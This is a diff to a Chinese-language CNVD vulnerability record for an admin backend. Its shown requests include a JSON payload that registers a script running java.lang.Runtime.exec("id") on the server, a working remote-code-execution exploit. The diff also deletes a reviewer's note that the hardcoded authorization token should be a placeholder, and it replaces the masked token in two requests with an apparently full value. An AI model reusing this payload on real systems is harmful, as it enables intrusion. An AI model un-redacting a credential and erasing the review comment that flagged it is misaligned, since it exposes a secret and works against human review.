@@ -37,7 +37,7 @@ schema_version: "1"
 
 - CNVD为主标识；后台前提清楚，默认凭证应当单独关联配置风险
 - 固定Content-Length与请求体不符，执行POST标1048但无正文
-- 硬编码测试authorization应换占位；未给最低漏洞权限或安全边界
+- 未给最低漏洞权限或安全边界
 
 ## 操作风险
 
@@ -124,7 +124,7 @@ Accept-Language: en
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
 Content-Type: application/json; charset=UTF-8
 Origin: http://10.0.12.15
-authorization: P*****************************************A
+authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
 
 {"id":"test","name":"test","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2025-02-28 15:54:17","updateTime":"2025-02-28 15:54:17"}
 ```
@@ -145,7 +145,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
 Content-Type: application/json; charset=UTF-8
-authorization: P*****************************************A
+authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
 Content-Length: 1048
 ```
 
